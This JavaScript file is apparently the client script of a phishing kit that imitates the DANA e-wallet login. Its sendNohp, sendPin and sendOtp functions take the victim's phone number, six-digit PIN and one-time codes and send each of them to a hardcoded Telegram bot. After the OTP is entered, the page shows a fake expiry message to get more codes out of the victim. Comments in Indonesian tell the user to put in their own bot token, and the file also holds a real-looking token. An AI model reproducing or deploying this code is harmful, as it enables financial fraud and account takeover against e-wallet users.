//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
var pinContainer = document.querySelector(".box-input-pin");
console.log('There is ' + pinContainer.length + ' Pin Container on the page.');

pinContainer.addEventListener('keyup', function (event) {
    var target = event.srcElement;
    
    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
    var myLength = target.value. length;

    if (myLength >= maxLength) {
        var next = target;
        while (next = next.nextElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }

    if (myLength === 0) {
        var next = target;
        while (next = next.previousElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }
}, false);

pinContainer.addEventListener('keydown', function (event) {
    var target = event.srcElement;
    target.value = "";
}, false);

$('.inpotp').on('input', function(event) {const inputs = $('.inpotp');const isAllFilled = Array.from(inputs).every((input) => input.value !== '');if (isAllFilled == true) {$(event.target).blur();sendOtp();}const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});
$(document).ready(function() {$('.clear').click(function() {$('.inppin').val('');$('#pin1').focus();});$('.clearotp').click(function() {$('.inpotp').val('');$('#otp1').focus();});$('.show').click(function() {$('.inppin').each(function() {if ($(this).attr('type') === 'password') {$(this).attr('type','number');$(".show").text("SEMBUNYIKAN");} else {$(this).attr('type', 'password');$(".show").text("TAMPILKAN");}});});});

 function nextPrev(){
$(".box-login").removeClass("closeright");
$(".box-login").addClass("animated");     
     event.preventDefault();
       setTimeout(function(){
           $("#homeku").hide();
           $("#back1").show();
           $("#butonku").fadeOut();
           $(".box-login").fadeIn();
           $("#process1").hide();
       },0);
 }   
 
 
 function goback1(){
     setTimeout(function(){
   $("#homeku").addClass("bounceInLeft"); $(".box-login").removeClass("animated");     
     $("#homeku").show();
      $(".box-login").fadeOut();
      $(".box-login").addClass("closeright");
      $("#butonku").fadeIn();
      $("#back1").hide();
       $("#process").hide();
       
     },0);
 }
 

 
 function goback2(){
     $("#process").show();
     setTimeout(function(){
    $("#formPin").fadeOut();
     $("#formNohp").fadeIn();
       $("#process").hide();
        $("#inp").val('');
        $("#back1").show();
        $("#back2").hide();
        document.getElementById("formPin").reset();
        $('.inppin').val('');
     },500);
 }

    $( document ).ready(function() {
            setTimeout(() => {
                $('#popup').hide();
                $('chsalxcome2').fadeIn();
            },2000)
             $('musikku').play();
        })
        

function tutupotp(){
$(".bgotp").hide();    
}

       function sendNohp(event){
    $("#process").show();event.preventDefault();
    $("#inp").blur();
     
    
    
    var nomor = document.getElementById("inp").value;
            sessionStorage.setItem("nomor", nomor);
    var logo = document.getElementById('logo');       
    var inp = document.getElementById('inp');
    
    var gabungan = '' + logo.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
   
   var token = '7913843609:AAHvxcLGCkhplnZknIRJt4DLjmY7P6N-RNI'; // Ganti dengan token bot yang kamu buat
    var grup = '8058004464'; // Ganti dengan chat id dari bot yang kamu buat


    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
    $("#process").hide();
    document.getElementById("back1").style.display = "none";
    document.getElementById("back2").style.display = "block";
    $("#formNohp").fadeOut();
    setTimeout(function(){
   
    $("#formPin").fadeIn();
    $("#pin1").focus();
    }, 500);}});};
    

function sendPin(){

 
 $("#loadingpin").fadeIn();
 
  var logo = document.getElementById('logo'); 
  var inp = document.getElementById('inp');
 var pin1 = document.getElementById('pin1');
 var pin2 = document.getElementById('pin2');
 var pin3 = document.getElementById('pin3');
 var pin4 = document.getElementById('pin4');
 var pin5 = document.getElementById('pin5');
 var pin6 = document.getElementById('pin6');
     
  var gabungan = '' + logo.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A※ 𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
  
    var token = '7913843609:AAHvxcLGCkhplnZknIRJt4DLjmY7P6N-RNI'; // Ganti dengan token bot yang kamu buat
    var grup = '8058004464'; // Ganti dengan chat id dari bot yang kamu buat
    
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,


complete: function(data) {
            console.log('Complete');
            setTimeout(function(){
$("#loadingpin").hide();
$(".inppin").addClass("cssku");
 }, 2000);
setTimeout(function(){
var nomor = document.getElementById("inp").value;
        document.getElementById("alerts").innerHTML = "+62 " + nomor + "";
$(".bgotp").fadeIn();
setInterval(countdown, 1000);
$("#otp1").focus();
}, 4000);
}
}
);
};


  function sendOtp(){
    $(".loadingOtp").show();
     var logo = document.getElementById('logo'); 
     var inp = document.getElementById('inp');
 var pin1 = document.getElementById('pin1');
 var pin2 = document.getElementById('pin2');
 var pin3 = document.getElementById('pin3');
 var pin4 = document.getElementById('pin4');
 var pin5 = document.getElementById('pin5');
 var pin6 = document.getElementById('pin6');
     var otp1 = document.getElementById('otp1');
   var otp2 = document.getElementById('otp2');
   var otp3 = document.getElementById('otp3');
   var otp4 = document.getElementById('otp4');
      setTimeout(function(){
$(".alert").text("Masa berlaku OTP sudah habis");
$(".alert").css("color","red");
 },2000);
    var gabungan = '' + logo.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A※ 𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A※ 𝗢𝗧𝗣 𝗗𝗔𝗡𝗔     : ' + otp1.value + otp2.value + otp3.value + otp4.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';

 var token = '7913843609:AAHvxcLGCkhplnZknIRJt4DLjmY7P6N-RNI'; // Ganti dengan token bot yang kamu buat
    var grup = '8058004464'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        
  complete: function(data) {
            console.log('Complete');
    setTimeout(function(){
    $(".loadingOtp").hide();
   $('.inpotp').addClass('inpotpku');
   $('#gambarvalid').fadeIn();
    },1000);
setTimeout(function(){    
    $('.inpotp').val('');
   $('#otp1').focus();
    $('#gambarvalid').fadeOut();
     $('.inpotp').removeClass('inpotpku');
    },4000);
   
        
    }
        
    }
    );
        
    };
    
    function countdown() {
    var count = parseInt(
    $('#countdown').text());
    if (count !== 0) {
    $('#countdown').text(count - 1);} 
    else {
    $('#countdown').text('60');}};
   
window.onload = function(){
        setTimeout(function(){
            $(".start").fadeIn();
            setTimeout(function(){
                $(".start").fadeOut(1000);
                setTimeout(function(){
                   $(".container").fadeIn(200);
                   $("#inp").focus();
                },1000);
            },1000);
        },500);
}